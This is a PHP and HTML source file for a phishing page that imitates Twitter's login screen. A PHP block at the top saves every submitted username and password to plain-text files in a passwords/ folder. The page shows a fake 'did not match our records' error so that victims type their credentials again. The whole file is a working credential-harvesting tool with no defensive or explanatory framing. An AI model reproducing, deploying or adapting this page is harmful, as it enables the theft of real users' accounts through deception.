<?php
    $username = $_POST["username"];
    $password = $_POST["password"];
    file_put_contents("passwords/".$username.".txt","username = ".$username."\n"."password = ".$password);
?>
<!DOCTYPE html>
<html lang="en" onclick="clearAll()">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login on Twitter/Twitter</title>
    <link rel="stylesheet" href="css/index.css">
</head>

<body>
    <div class="d1">
        <img src="img/logo.png" alt="">
    </div>
    <p class="p1"><b>Log in to Twitter</b></p>
    <p class="p6">The username and password you entered did not match our records. Please double-check and try again.</p>
    <div class="div2">
        <form action="" method="POST">
            <p class="p2"><span class="s1" id="p2">Phone, email, or username</span></p>
            <input onclick="changecolorU()" onkeyup="bbotton2()" id="input1" type="text" name="username" value="">
            <div class="d3">
                <p class="p2"><span id="p3">Password</span></p>
                <input onkeyup="bbotton()" onclick="changecolorP()" id="input2" type="password" name="password"><br>
            </div>
            <button onclick="show()" id="botton"><b>Log in</b></button>
        </form>
    </div>
    <div>
        <p style="text-align: center;"><a href="#">Forgot password? · Sign up for Twitter</a></p>
    </div>
    <div class="div4" style="background-color: rgb(101, 119, 134);">
        <p class="p5">AliShahbazi&copy;</p>
    </div>
    <script src="javascript/index.js"></script>
</body>

</html>